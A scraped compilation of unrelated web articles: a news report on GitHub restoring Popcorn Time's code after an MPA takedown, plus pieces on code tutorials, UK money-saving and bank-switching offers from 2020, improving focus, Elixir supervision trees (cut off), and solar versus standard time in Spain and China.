			<p>For more than half a decade, Popcorn Time has been a thorn in the side of Hollywood. </p>
<p>The ‘Netflix for Pirates’ offers an easy-to-use application that opens the door to a library of thousands of streamable movies and TV-shows. </p>
<p>The Motion Picture Asociation (MPA) recognized this threat early on and pressured the original developers to throw in the towel. That worked, but it came too late as the open-source project was swiftly revived by others.</p>
<p>Today, Popcorn Time lives on through many project forks. The most popular is PopcornTime.app, which like its predecessor, <a href="https://github.com/popcorn-official" target="_blank">shares its source code publicly</a> on the developer hosting platform GitHub. This allows others to download, modify, and share it. </p>
<p>The MPA is not happy with this and took action recently. The movie industry group <a href="https://torrentfreak.com/mpa-suggests-github-could-be-held-liable-for-popcorn-times-copyright-infringements-200505/" target="_blank">informed GitHub</a>, which is owned by Microsoft, about the infringing nature of the software. According to the MPA, the application includes links to pirate sites, pirate APIs, and pirate torrent trackers, which are used to download pirated movies and TV-shows.</p>
<center><img src="https://torrentfreak.com/images/mparequest.jpg" alt="" width="500" height="354" srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20354'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" data-lazy-src="https://torrentfreak.com/images/mparequest.jpg"></center>
<p>On top of that, the MPA suggested that GitHub itself may be liable for copyright infringement if the company fails to take action. </p>
<p>While the MPA’s interpretation of the law is likely not shared by GitHub, the company did remove the Popcorn Time code. In most cases that would be the end of the story, but Popcorn Time was not backing off without a fight. </p>
<p>The developers submitted a DMCA counternotice explaining that the MPA’s request is not legitimate. The code is owned by Popcorn Time, not the MPA, and Popcorn Time asked GitHub to restore access. </p>
<p>“The code is 100 % ours and do not contain any copyright [sic] material please check again,” the <a href="https://github.com/github/dmca/blob/d7f4a6a3aade92999d4d86962972c4b27af820e3/2020/05/2020-05-04-MPA-counternotice.md" target="_blank">developer wrote</a>.</p>
<p>The app’s developers made a good point here. The identified code (not the built app) is not directly copyright infringing and it contains no direct links to copyright-infringing material either. This means that a DMCA notice may not be the right tool here.</p>
<p>Faced with both requests, GitHub has now decided to restore full access to the Popcorn Time repository. </p>
<p>This decision doesn’t necessarily mean that it agrees with the app developers, however. The DMCA simply prescribes that, following a counternotice, content can be restored after two weeks, unless the claiming party files a lawsuit. </p>
<center><img src="https://torrentfreak.com/images/popcorngit.jpg" alt="" width="590" height="451" srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" sizes="(max-width: 590px) 100vw, 590px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20590%20451'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" data-lazy-src="https://torrentfreak.com/images/popcorngit.jpg"></center>
<p>In this case, the MPA chose not to file a lawsuit against the Popcorn Time operators, so the code repositories are back online again. </p>
<p>Whether the MPA will follow-up with further action has yet to be seen. However, the whole episode highlights an interesting issue. There is little doubt that the Popcorn Time application is a pirate app. However, the code, as hosted by GitHub, is not infringing per se. As such, regular takedown notices don’t appear to work here.</p>

<![CDATA[Creating Effective Tutorials for Your Dev Team]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-75e492e5="" data-v-61c0ab88=""><div><p>Creating tutorials for your codebase is not an intuitive task for many teams. How to tackle it? What makes for a good tutorial? How do we measure the effectiveness of a code tutorial correctly?</p>
<p>We covered dozens of tutorials and approaches at different companies and organisations, and here are the 5 elements we found every code tutorial has to have. We’re willing to go as far off and say: if your onboarding tutorials do not meet the following criteria - you probably shouldn’t bother creating them in the first place.</p>
<h2>What Makes a Code Tutorial Effective?</h2>
<p>While providing your engineers with code tutorials can be a time consuming task for everyone, tutorials pose some innate benefits that will help keep your onboarding programs effective and sustainable and internal knowledge sharing levelled up.</p>
<p><strong>Great code tutorials are:</strong></p>
<ol>
<li>Focused - highlighting just the part of the repo which your engineer needs to learn to get started. If the readers need to look through dozens of paragraphs to find what they were looking for, they might not even bother searching. In other words, tutorials are not like your history essay from high-school - You lose points for length and breadth.</li>
<li>Highlight the “Why”. They show a clear explanation of the logic behind the code and/or why it is like it is now.</li>
<li>They show a process rather than the mere solution. It’s much easier to understand code by seeing the process of its creation or the flow of information, rather than just looking at a freeze frame of what it looks like now.</li>
<li>Tinkering - they enable a sandbox experience or learning by doing. It’s similar to getting thrown a task from the backlog in the sense that it is hands on, however it is structured, and guided in a way that evokes deductively understanding codebase logic, and also does not require the time and investment a backlog task would.</li>
<li>Up to date. They have to be practical and up to date with the current code. What usually kills good tutorials is if they are outdated. Not only will they waste the reader’s time, they might cause actual damage by misleading. This is the number one reason that many engineers distrust tutorials, and documentation in general.</li>
</ol>
<h2>Recap</h2>
<p>Good tutorials are hard to make and maintain. Although, easier said than done, the key is to keep them updated, focused and encourage an independent learning process. The next step to tune-it up, would be to make sure we measure the effectiveness of our tutorials (more on that in a future post), and gather feedback to improve over time.</p>

These are not the type of ideas that will bring in huge sums of money. No. These are little things you can do every day to earn or save some money to survive a recession, unemployment or any other temporary financial setback.</p><p>If you have a stable job and earn about £100k a year, this list probably isn't for you. This list is for people who've been made redundant and need money to help them get by until they find a new job. It's for a mother who just had a baby, isn't working, and has a couple of hours to spare each day. It's for that person who is curious and wants to know how to make £5 today or £50 tomorrow.&nbsp;</p><p>If this all makes sense, here are my top twelve ideas for making money online to survive a recession in 2020. Note that the examples I used here are specific to the UK, but the general ideas are applicable globally.<br></p><h2><strong>1. Online Surveys</strong></h2><blockquote>Get paid to participate in research from universities and companies.</blockquote><ol role="list"><li><a href="https://prolific.co/" target="_blank"><strong>Prolific</strong></a> - The pay is roughly about minimum wage. The more surveys you do, the more you'll earn. There's a Chrome extension that alerts you whenever a new survey is available. You'll need at least a fiver to cash-out, which is roughly three to six surveys.</li><li><a href="https://www.qmee.com/" target="_blank"><strong>Qmee</strong></a> - Earn cash rewards for engaging with brands and for sharing your opinion by answering surveys. There's no minimum payout, and the money goes straight to PayPal.</li><li><a href="https://yougov.co.uk/" target="_blank"><strong>YouGov</strong></a><strong> </strong>- Complete surveys to earn points. You can redeem your points for £50 cash.</li><li><a href="https://surveys.google.com/google-opinion-rewards/" target="_blank"><strong>Google rewards</strong></a> - Complete short surveys and get rewarded with Google Play or PayPal credits. The payout is quite small, so most people use it to pay for things like magazine subscriptions and mobile games.</li><li><a href="https://www.populuslive.com/" target="_blank"><strong>PopulusLive:</strong></a> Earn money for completing surveys. The minimum payout is £50. Payments are made by bank transfer (BACS) or by cheque.</li></ol><h2><strong>2. Cashback</strong></h2><blockquote>‍<strong>‍</strong>Cashback is a service that lets you get money back on goods, services, and travel through exclusive partnerships with brands and leading retailers. For example, if you spent £50 at Tesco and got a 10% cashback, that's free £5 in your pocket. Here's how to get cashback:</blockquote><ol role="list"><li><strong>Banks </strong>- Some of the big banks offer cashback to their customers. Check your mobile app or online banking to see if your bank offers cashback. Here are a few popular ones: <a href="https://www.barclays.co.uk/current-accounts/cashback/" target="_blank">Barclays</a> (up to 10% cashback), <a href="https://www.lloydsbank.com/online-banking/benefits-online-banking/everyday-offers.html" target="_blank">Lloyds</a> (up to 15% cashback) and <a href="https://www.santander.co.uk/personal/support/understanding-our-services/retailer-offers" target="_blank">Santander</a> (up to 15% cashback).</li><li><strong>Cashback Sites </strong>- These are independent companies that give you money back when you buy from one of their registered retailers or brands. The popular ones are <a href="https://www.quidco.com/" target="_blank">Quidco</a>, <a href="https://www.shopmium.com/uk" target="_blank">Shopmium</a>, <a href="https://ohmydosh.co.uk/" target="_blank">OhMyDosh</a>, <a href="https://www.swagbucks.com/" target="_blank">Swagbucks</a>, and <a href="https://www.topcashback.co.uk/" target="_blank">TopCashback</a>.</li></ol><h2><strong>3. Earn Rewards for your Data </strong></h2><blockquote>With these services, you share some of your data like a scanned copy of your supermarket receipt to earn rewards. Here are some companies that offer these services:</blockquote><ol role="list"><li><a href="https://www.airtimerewards.co.uk/" target="_blank"><strong>Airtime Rewards</strong></a> - This is great for people looking to reduce or offset their mobile phone bills. You need to link your card first, then each time you make a purchase at a registered retailer, you'll earn a reward. You can redeem this reward to your mobile bill.&nbsp;</li><li><a href="https://www.shoppixapp.com/" target="_blank"><strong>Shoppix</strong></a><strong> </strong>- Snap receipts and answer surveys to collect tokens.

Energy Auto-switching</strong><br></h2><blockquote>This one saves you time and money. Auto-switching companies automatically switch your energy tariff to keep you on the best deal. It takes about two minutes to sign up, and it's completely free except you opt-in for a paid plan. Here are the ones we feature on Koody:</blockquote><ol role="list"><li><a href="https://partner.koody.co/switchd" target="_blank"><strong>Switchd</strong></a> - Depending on the size of your home, you could save £400+ a year.</li><li><a href="https://partner.koody.co/LAMB" target="_blank"><strong>Look After My Bills</strong></a> - 99% of new members on credit meters find a saving straight away.</li></ol><p>‍<br></p><h2><strong>7. Smart Savings</strong><br></h2><blockquote>You will hardly make any new money from this idea. Instead, you'll save some of what you already have. Here's how to save smartly:</blockquote><ol start="" role="list"><li><strong>Round Ups</strong> - Some apps like <a href="https://www.moneyboxapp.com/" target="_blank">Moneybox</a> help you save your spare change by rounding up your card transactions to the nearest pound and saving the difference (e.g., if you spend £2.30 on a snack, these apps save 70p for you). Over an extended period, this money adds up and could become quite valuable. Some banks also offer round ups. Check to see if your bank does.&nbsp;</li><li><strong>Auto-saving</strong> - Automating your savings saves you time and reduces the temptation of spending above your budget. There are two ways you can automate your savings:<strong>‍</strong></li></ol><ul role="list"><li>~~Do it yourself<strong> </strong>- Set up a standing order to move money from your current account to your savings account every month. This is easy, and you can do it with your bank's mobile app or online banking.<strong>‍</strong></li><li>~~Use an auto-savings app - Some apps will automate your savings by moving money from your current account to an e-wallet regularly. These apps are useful if you want to reduce the temptation of dipping into your savings. Here are a few popular ones: <a href="https://withplum.com/" target="_blank">Plum</a>, <a href="https://www.getchip.uk/" target="_blank">Chip</a>, <a href="https://www.tandem.co.uk/" target="_blank">Tandem</a> and <a href="https://www.meetcleo.com/" target="_blank">Cleo</a>.

Bank Switching Deals</strong></h2><blockquote>Many big banks will offer you money to move your current account over to them. I'm not a massive fan of bank switching deals because it can take several months to receive the bonus. But, if you're a patient person, you should check out the ones below:</blockquote><p><strong>1. </strong><a href="https://personal.natwest.com/personal/current-accounts/select_account.html" target="_blank"><strong>Natwest Everyday Bank Account</strong></a> - £125 switching bonus (available to new and existing customers).</p><p><strong>How it works</strong></p><ul role="list"><li>Pay in at least £1,500 by 15th January 2021.&nbsp;</li><li>Log in to your mobile app or online banking by 15th January 2021.</li><li>Receive the £125 bonus by 12th February 2021.</li><li>Offer runs until 19th November 2020.</li></ul><p><strong>2.</strong>‍<a href="https://www.hsbc.co.uk/current-accounts/products/advance/" target="_blank"><strong> HSBC Advance</strong></a><strong> </strong>- £125 bonus when you switch to HSBC + access to 2.75% Regular savings account.</p><p><strong>How it works</strong></p><ul role="list"><li>Open the account as a new customer.</li><li>Use the Current Account Switch Service within 30 days to complete a full switch with at least two direct debits or standing orders.</li><li>The bonus will be paid within 30 days of the switch completing.</li><li>You will need to pay in £1,750 or more each month (you can always close the account once you've received the bonus).</li></ul><p>‍</p><p><strong>3.</strong><a href="https://personal.rbs.co.uk/personal/current_accounts.html" target="_blank"><strong> RBS</strong></a><strong> </strong>- £100 bonus when you switch to RBS</p><p><strong>How it works</strong></p><ul role="list"><li>Pay in at least £1,500 by 30th December 2020.</li><li>Log in to your mobile app or online banking by 30th December 2020.</li><li>Receive your £100 bonus by 29th January 2021.</li><li>Offer runs until 19th November 2020.</li></ul><p>‍</p><p><strong>4. </strong><a href="https://www.lloydsbank.com/current-accounts/switch.html" target="_blank"><strong>Lloyds Bank</strong></a><strong> </strong>- £100 when you switch to Lloyds bank.</p><p><strong>How it works</strong></p><ul role="list"><li>Pay in at least £1,500 by 30th December 2020.</li><li>Log in to your mobile app or online banking by 30th December 2020.</li><li>Receive the £100 bonus ten working days after switching.</li><li>Offer runs until 9th November 2020.</li></ul><p>‍</p><p><strong>5. </strong><a href="https://www.metrobankonline.co.uk/about-us/press-releases/news/metro-bank-new-refer-a-friend/" target="_blank"><strong>Metro Bank</strong></a><strong> </strong>- If you are an existing Metro bank customer, you can refer a friend, and you'll both receive £50 after your friend successfully switches to Metro. The offer runs until 11th December 2020.</p><p>‍<br></p><h2><strong>9. Sell Old Stuff Online</strong></h2><blockquote>Selling your old stuff online is one of the best ways to make money quickly. It is also pretty straightforward and effortless to implement. You can sell anything from used clothes to old gadgets. You also can list your products as 'collection only' so you don't have to bother about delivery and delivery costs. However, if you want to appeal to a broader audience, remember to factor in delivery costs. Here are a few places where you can sell things online:</blockquote><ol role="list"><li>Facebook Marketplace</li><li>Instagram</li><li>eBay</li><li>Etsy</li><li>Amazon</li></ol><p>‍<br></p><h2><strong>10. Hobbies</strong></h2><blockquote>Identify your hobby and find a way to make money from it. Here are a few popular hobbies and my suggestions on how to make money from them:</blockquote><ol role="list"><li><strong>Drawing/Painting </strong>- sell your art online.</li><li><strong>Handyman </strong>- list your services online.</li><li><strong>Gardening</strong> - sell the house plants online.</li><li><strong>Photography</strong> - sell your photos using image hosting services like <a href="https://www.smugmug.com/" target="_blank">SmugMug</a>.</li><li><strong>Writing</strong> - start a blog.</li><li><strong>Cooking</strong> - start a youtube channel or an Instagram or TikTok account.</li></ol><p>‍</p><h2><strong>11. Employee Discounts</strong><br></h2><p>People often forget to take advantage of employee perks. Websites like <a href="https://www.perksatwork.com/" target="_blank">Perks At Work</a> and <a href="https://www.perkbox.com/uk" target="_blank">Perkbox</a> offer discounts on several retailers and brands. Employee perks are company-specific, so if you and your partner don't work in a company that offers them, you won't be able to benefit from them.&nbsp;</p><p>‍</p><p>Combining employee perks with cashback offers can be quite powerful and can significantly reduce your bills. It is also worth adding that even if it's just your partner who has access to these discounts, you can also benefit from them.</p><p>‍</p><h2><strong>12. Improve your Skills</strong></h2><p>If you've been made redundant, there's never been a better time to start improving your skills.</p><p>As you take advantage of some of the money-making ideas I listed above, try to dedicate some time each …</p></div></div></div></div>

       <p>Why can't we focus anymore? Why is it so difficult to focus on reading, studying, or thorough problem solving?</p>
       <p>Before we dive into the actionable part, here are some simple reasons why it's harder than ever to focus.</p>
       
       <h2>Why we can't focus</h2>
       <h4><strong>Reason #1: we process more information than ever.</strong></h4>
       <p>According to researchers from the University of California-San Diego, we consume through our phones, laptops, TVs and all other devices about&nbsp;<a target="_blank" href="https://ijoc.org/index.php/ijoc/article/viewFile/1566/743">34 GB of information per day.</a></p>
       <p>The researchers say this leads to an information overload that hampers our focus and leads to constant interruptions that prevent us from reflection and deeper thinking.</p>
       
       
       <h4><strong>Reason #2: filtering out information takes effort.</strong></h4>
       <p>Contrary to common sense,&nbsp;<strong>ignoring things is not a passive mental process.</strong></p>
       <p>Researchers have found that&nbsp;<strong>it takes energy to ignore irrelevant stimuli.</strong></p>
       <p>In the Distracted Mind, neuroscientist Adam Gazzaley writes:</p>
       <blockquote><p>What we learned from this experiment was that the act of ignoring is not a passive process; rather, the goal to ignore something is an active one that is mediated by the top-down suppression of activity below baseline levels of passively viewing.</p>
       <p><a target="_blank" href="https://www.ncbi.nlm.nih.gov/pubmed/15814009">(Source)</a></p>
       </blockquote>
       <p>It's not just about focusing better, but also about&nbsp;<em>ignoring better.</em></p>
       
       
       <h4><strong>Reason #3: we're being trained like mice by a variable-ratio reward schedule.</strong></h4>
       <p>Every like on social media, every notification, every email represents something&nbsp;<em>new!!!</em></p>
       <p><em>New</em>&nbsp;is exciting for us. Every such message releases the&nbsp;<a target="_blank" href="http://sitn.hms.harvard.edu/flash/2018/dopamine-smartphones-battle-time/">neurotransmitter dopamine</a>&nbsp;in our heads, making us feel good and adventurous.</p>
       <p><em>What if my crush sent me a message?</em><br>
       <em>What if I got that job?</em><br>
       <em>What if a friend wants to meet up and hang?</em></p>
       <p>Unlike in the past, now we carry with us devices that enable us to check if the above is true in about 3 seconds.</p>
       <p>How are we then supposed to do work which may require serious mental effort when we have dopamine-candy within our reach almost 24/7?</p>
       
       <p><strong>We process more information than ever, so filtering out the noise takes a lot of effort, and we're constantly being led astray from focus by dopamine-loaded interruptions. No wonder we can't focus.</strong></p>
       
       <h2>How to improve focus</h2>
       <p>Given that ignoring is an active process, we'll suggest ways to both ignore noise better and focus on the signal better.</p>
       <h3>Strategic focus vs task focus</h3>
       <p>Before we go any further, we'll split focus into 2 types:</p>
       <ul>
       <li><strong>1. Strategic focus</strong><br>
       Answering the question: What to focus on?</li>
       <li><strong>2. Task focus</strong><br>
       Answering the question: How do I focus on work?</li>

       </ul>
       
       <h3>1. How to improve strategic focus</h3>
       <p>Let's start with the obvious.</p>
       
       <h4>Define what you want to focus on</h4>
       <p>It's hard to focus on something if you don't know what it is.</p>
       <p>If you're looking into a heavy fog, there's nothing to focus on. Same goes for mental fog.</p>
       <p>While it's becoming popular to say "systems &gt; goals" or even "no goals" at all, we are goal-driven by nature.</p>
       <p>On a neural level, we filter information through our goals. Our perception of reality is to a large extent driven by goals.</p>
       <p>As neuroscientist Adam Gazzaley writes in the Distracted Mind:</p>
       <blockquote><p>... the inward flow of information is sculpted and pruned by goals in much the same way that our actions are, resulting in our perceptions being an interpretation of reality and not a veridical representation.</p>
       </blockquote>
       <p>In other words, when you're looking for Waldo, your mind activates neural circuits to find someone in a red-striped shirt and ignores almost all else.</p>
       <p>Your goal determines your perception of reality. You're more likely to spot information relevant to your goal than all other information out there.</p>
       <p>If you have a clear goal, it will be that much easier to spot the right information to help you achieve it and ignore the noise.</p>
       <p>Which brings us to this question:<br>
       <strong>What do you want to do?</strong></p>
       <p>Make a list.</p>
       <p>Once you have some sort of a list, it's not yet time to pursue all the items on it.</p>
       <p>It's time to prioritize and refine.</p>
       
       <h4>Define what&nbsp;<em>not</em>&nbsp;to focus on - use Warren Buffett's goal setting method</h4>
       <p>Once you have any kind of a list of things you'd like to accomplish, it's not yet time to pursue goals. That would be unfocused.</p>
       <p>Here's Warren Buffett's advice on goals:</p>
       <ol>
       <li>Write down the top 25 goals that you want to achieve in life.</li>
       <li>Select the 5 that matter the most.</li>
       <li>Forget the rest.</li>

       </ol>
       <p>Buffett highlights that pursuing all 25 will distract you. It will lead to a haphazard, unfocused approach that likely won't lead to results.</p>
       <p>The general principle of picking fewer goals than you think you want can be applied every day. It's a safeguard against the tendency to pick too many goals and diffuse your efforts.</p>
       
       <h4>Find 2 Wildly Important Goals<br>(and put them where you'll see them)</h4>
       <p>In 4 Disciplines of Execution, the authors recommend finding 2 wildly important goals (WIGs).</p>
       <p>WIGs are goals that are so important that if you achieve them, everything else will likely work out.</p>
       <p>They also recommend putting your goals into a specific format:<br>
       <strong>X to Y by when.</strong></p>
       <p>If you were to define the 2 Wildly Important Goals to focus on, what would they be?</p>
       <ul>
       <li>Get to $10 000 in revenue by July 1.</li>
       <li>Write 50 000 words by August 31st.</li>
       <li>...</li>

       </ul>
       <p><strong>Define your goals to have a clear target to focus on.</strong></p>
       <p>However, that's not enough. You can write down the goals and forget them. Completely.</p>
       <p>You need to be hyper-aware of those goals, so that they stay on your mind even through the daily turmoil of life.</p>
       <p>How to do that?</p>
       <p>How to focus on goals that matter despite the noise? </p>
       
       <h4>Create an ambient visual reminder for WIGs</h4>
       <p>Once you have clear goals, you need to make them obvious to you every day.</p>
       <p>To do that, we recommend creating an ambient visual reminder.</p>
       <p>A post-it note written with a thick marker on your desk.<br>
       A big poster above your door.<br>
       A timeline on a whiteboard.</p>
       <p>Something in your&nbsp;<em>physical</em>&nbsp;(not digital) environment.</p>
       <p>The trouble with a digital environment is that if you have a goal written in a to-do app of some sort, once you close it it's out of sight out of mind. If you don't open the app in the morning, you don't get reminded of the goal.</p>
       <p><strong>Create a highly visual reminder for your goals and place it in your surroundings so that you see it every day. Every time you glance at it, it will remind you to focus.</strong></p>
       
       <h4>Strategic focus - summary</h4>
       <ol>
       <li><strong>Define what to focus on.</strong><br>
       Make a written list.</li>
       <li><strong>Select only the top-most items from that list - ideally 2 items.</strong><br>
       Decide to explicitly&nbsp;<em>not</em>&nbsp;focus on other, less important goals at the moment.</li>
       <li><strong>Phrase them in the following way: From X to Y by when.</strong></li>
       <li><strong>Place a visual reminder in your surroundings.</strong><br>
       Put it somewhere in your physical environment where it's impossible to miss.</li>

       </ol>
       <p>If you do this, you will become hyper-aware of when you're moving towards your most important goals, and when you're not. What you need to focus on will stay at the top of your mind, instead of being forgotten.</p>
       
       
       <h3>2. How to improve task focus</h3>
       <p>Once you know what to focus on, it's time to focus on it.</p>
       <p>As we mentioned before, ignoring irrelevant stimuli is not a passive process. It takes effort.</p>
       <p>It makes sense to divide improving concentration into 2 parts:</p>
       <ul>
       <li>Improve ignoring</li>
       <li>Improve concentration</li>

       </ul>
       <p>Let's get into it.</p>
       
       <h4>How to ignore better</h4>
       <p>To minimize the effort required to ignore irrelevant stimuli, either remove them if you can, or use something to make it easier to block out the noise.</p>
       <ul>
       <li><p><strong>Put on noise-canceling headphones.</strong><br>
       This is taking the&nbsp;<em>ignore the noise</em>&nbsp;literally. Background noises can disrupt our attention (especially true for people with ADD/ADHD). Whether it is your neighbors arguing or a&nbsp;<em>PING!</em>&nbsp;of a notification, if you can't hear them, you don't need to take the effort to filter them out.</p>
       </li>
       <li><p><strong>Find a quiet place to work.</strong><br>
       Sometimes even noise-canceling headphones aren't enough, in that case a public library or an empty class/conference room might do wonders. Even a different room can work.</p>
       </li>
       <li><p><strong>Declutter.</strong><br>
       Headphones will help with auditory clutter, but what about visual clutter?<br>
       If you have 50 post-its with ideas and to-do lists in sight, it'll take more effort to not glance at them. Remove them.<br>
       Same goes for 25 open browser tabs. Close them or go into fullscreen mode.</p>
       </li>
       <li><p><strong>Batch distracting activities.</strong><br>
       If you need to respond to emails or work requests as they come, learn to ignore them, if for but a moment.<br>
       Deal with emails once every 30 minutes, or once an hour, instead of checking it randomly whenever you get a tiny bit bored or stressed.<br>
       Minimize the number of switches between tasks.</p>
       </li>
       <li><p><strong>Minimize distractions before a work session.</strong></p>
       <p>The phone is a distraction machine. Sure, we can use it productively, but when it's sitting on our desks during work, it's a constant reminder that we could be doing something&nbsp;<em>fun</em>&nbsp;instead.<br>
       Here are our suggestions on minimizing digital distractions:</p>
       <ul>
       <li>Use the&nbsp;<strong>Rule of 3 Senses: hide your phone out of sight, reach, and hearing.</strong><br>
       Put your phone where you can't see, reach it, or hear it. A drawer or a backpack both work.</li>
       <li><strong>Block distracting sites on your computer.</strong><br>
       You can use&nbsp;<a target="_blank" href="https://www.deprocrastination.co/home">our extension</a>&nbsp;or some other extension that performs the same function - blocking distracting sites in your browser. When you don't have the option of opening a new YouTube tab and going down a rabbit hole, you can focus better.</li>

       </ul>
       </li>

       </ul>
       
       <h4>How to concentrate better</h4>
       <p>Now that we have less to ignore, how to really hone in on work?</p>
       <ul>
       <li><p><strong>Go…</strong></p></li></ul></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Tags: programming, elixir, supervisor, supervision tree</p></div><p data-v-d417aca0="">As developers, we always strive to offer our clients a high-quality service (or at least we should :) ). One of the most important features of high-quality service is its reliability. In other words, the service should rarely, if ever, be unavailable.</p><p data-v-d417aca0="">In the Elixir world, we can achieve this easily using a concept known as a supervision tree. Supervision tree is a structure of processes that allows us to build reliable, fault-tolerant and self-healing systems. This can make our application resistant to unexpected bugs that can creep up in the production. The kind of bugs that are really difficult to reproduce and that require specific state of the application to appear (google the term heisenbug). Supervision tree helps us in dealing with those kinds of bugs by simply restarting the part of the tree that's causing the problems. That way, we get to start off with a clean slate, and most of the times, that's enough to solve our issues.</p><p data-v-d417aca0="">So, how does Elixir make that possible?</p><p data-v-d417aca0="">First, let's take a look at how a supervision tree looks graphically.</p><p data-v-d417aca0=""><img src="https://kodius.com/images/blog/elixir-supervision-tree-complex.png" alt="complex tree" data-v-d417aca0=""></p><p data-v-d417aca0="">At its core, the supervision tree consists of two types of processes: workers and supervisors (imaginatively marked W and S, respectively).</p><p data-v-d417aca0="">Workers are simply processes which run some kind of logic. They are the meat of your application. Supervisors, on the other hand, are processes which supervise other processes, be it workers or other supervisors. This sounds like some kind of processeption, but at its base, it's not that complicated.</p><p data-v-d417aca0="">There are two main tasks a supervisor has: restarting its children processes in the desired way when they terminate (expectedly or unexpectedly), and terminating itself along with its children processes if it deems necessary, i.e. when there's something off with the state in its part of the application.</p><p data-v-d417aca0="">In simpler terms, workers run the domain code and if some error occurs and the worker crashes, or it finishes its work and “dies”, its supervisor restarts it. If crashing happens too often, the supervisor terminates the said process, along with the rest of its children and then terminates itself.</p><p data-v-d417aca0="">There are three available restart strategies:<br data-v-d417aca0="">- <code data-v-d417aca0="">:one_for_one</code> - the supervisor restarts just the process that terminated,<br data-v-d417aca0="">- <code data-v-d417aca0="">:one_for_all</code> - the supervisor restarts all of its children if any of its children processes terminates,<br data-v-d417aca0="">- <code data-v-d417aca0="">:rest_for_one</code> - the supervisor restarts the terminated process and the processes defined after the crashed one (I'll refer to this later, to make it more clear with an example).</p><p data-v-d417aca0="">If the restart strategy isn't enough to fix our application, self-termination kicks in. When we define a supervisor process, we can also define its restart tolerance, i.e. how many restarts of its children it will tolerate in certain amount of time before it decides to terminate itself and its children processes (default tolerance is total of 3 restarts in 5 seconds). That way we propagate process restart one level up, making the parent supervisor process restart our supervisor process, which, in turn, starts all of its children processes once again, and we're starting off with a clean slate.</p><p data-v-d417aca0="">Now, enough theory, let's put all this into practice!</p><h2 id="“simple-supervision-tree”" data-v-d417aca0="">Simple supervision tree</h2><p data-v-d417aca0="">Let's start off by making an extremely simple supervision tree, which will be made of one supervisor process and two of its children, which will be workers.</p><p data-v-d417aca0=""><img src="https://kodius.com/images/blog/elixir-supervision-tree-simple.png" alt="simple-tree" data-v-d417aca0=""></p><p data-v-d417aca0="">First, we'll define our supervisor process.</p><pre data-v-d417aca0=""><code data-v-d417aca0=""><span data-v-d417aca0=""><span data-v-d417aca0="">defmodule</span> <span data-v-d417aca0="">SimpleSupervisor</span></span> <span data-v-d417aca0="">do</span>

    <p>A few years ago I went to Spain for the first time, and like many I was surprised by <strong>how late is dinner</strong>. The first night I dined almost alone in a restaurant at 8pm, going away just as people were starting to come in. Of course this can be mostly explained by cultural reasons, but the clearly later-than-usual summer sunsets must also have played a role in shaping the Spanish days.</p>

    Solar time vs standard time

</figure>

<p>At the time I’m writing, near the winter solstice, Madrid’s sunset is around 17:55, <strong>more than an hour later</strong> than the sunset in, for example, Naples, which is at a similar latitude. The same difference holds at the summer solstice and around the year. Just because it applies to most places I’ve been, a time like that in Naples feels more natural to me, and probably to most non-Spanish people. But is it?</p>

<p>Looking for other regions of the world having the same peculiarity of Spain, I edited a <a href="http://commons.wikimedia.org/wiki/File:Standard_time_zones_of_the_world_(2012)_-_Pacific_Centered.svg">world map from Wikipedia</a> to show the difference between solar and standard time. It turns out, there are many places where <strong>the sun rises and sets late in the day</strong>, like in Spain, but not a lot where it is very early (highlighted in red and green in the map, respectively). Most of Russia is heavily red, but mostly in zones with very scarce population; the exception is St. Petersburg, with a discrepancy of two hours, but the effect on time is mitigated by the high latitude. The <strong>most extreme</strong> example of Spain-like time is western China: the difference reaches three hours against solar time. For example, today the sun rises there at 10:15 and sets at 19:45, and solar noon is at 15:01.</p>

<p>So, why do some countries are forced to have such discrepancies? The only way to assign to a place a <strong>canonical time</strong> which follows our main assumptions is to observe the instant in the day when the Sun is higher in the sky, and call that 12:00. This is <strong>not practical</strong> for at least two important reasons.</p>

<figure>
 <div>
  <p><a href="http://blog.poormansmath.net/images/analemma-sun.jpg">

  </a></p><figcaption>
    Analemma of the sun
  </figcaption>
 </div>
</figure>

<p>One is that (solar) <strong>days do not all have the same length</strong>: the modern calendar compensates by letting midday oscillate a bit around the year: for example, midday in Naples goes from 11:47 in early November to 12:17 in early February. The difference between solar noon and clock noon is beautifully explained by an analemma, a picture with an exposure taken every few days at clock noon, showing how the sun moves in the sky not only in height (the north-south) direction due to the different seasons, but also in the east-west direction due precisely to the different lengths of the solar days.</p>

<p>More importantly, <strong>each city at a slightly different longitude would have a slightly different time</strong>. It seems strange that time systems with such a huge problem had ever been practical, but in the pre-industrial-revolution world, travels were so uncommon and slow that this problem was no more than a minor annoyance. But in today’s hyper connected (physically and virtually) world, it is obviously not an option.</p>

<p>The transition from apparent solar time, where all days have different lengths, to solar mean time, where midday wanders around 12:00, was caused by the proliferation of <strong>mechanical clocks</strong> in the early 19th century. The change to a time zone system, to solve the second problem, was caused instead by the telegraph and even more by the spreading of <strong>railway networks</strong> in the second half of that century; it’s not a coincidence that the first country moving to a common time was Great Britain.</p>

<p>Indeed, if we acknowledge that the two problems must be solved, the natural result is the current <strong>time zone system</strong>. The immediate consequence is that in the western part of the time zone the sun rises and sets later than in the eastern part. Normally, these differences amount to at most half an hour in either direction, but <strong>human geography</strong> sometime forces greater differences. In Spain’s case, to allow Spain to have the same time as central Europe, the difference can exceed ninety minutes. China instead decided in 1949 to adopt a single time zone, and to place its center in the richer east, forcing the less populated west to have an uncomfortable time. Indeed, though not officially recognized by the government, people in Xinjiang (China’s west-most region) follow a time zone closer to their apparent solar time, shifted by two hours from Beijing time.</p>
